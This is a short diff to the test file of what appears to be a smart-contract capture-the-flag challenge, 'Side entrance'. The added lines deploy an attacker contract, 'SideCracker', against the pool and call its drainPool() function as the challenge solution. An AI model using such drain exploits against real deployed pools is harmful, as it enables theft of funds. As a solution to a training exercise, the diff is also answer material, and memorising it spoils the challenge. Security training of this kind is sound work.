@@ -26,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const sideCrackerFactory = await ethers.getContractFactory('SideCracker', player);
+        const sideCracker = await sideCrackerFactory.deploy(pool.address);
+        await sideCracker.drainPool();
     });
 
     after(async function () {
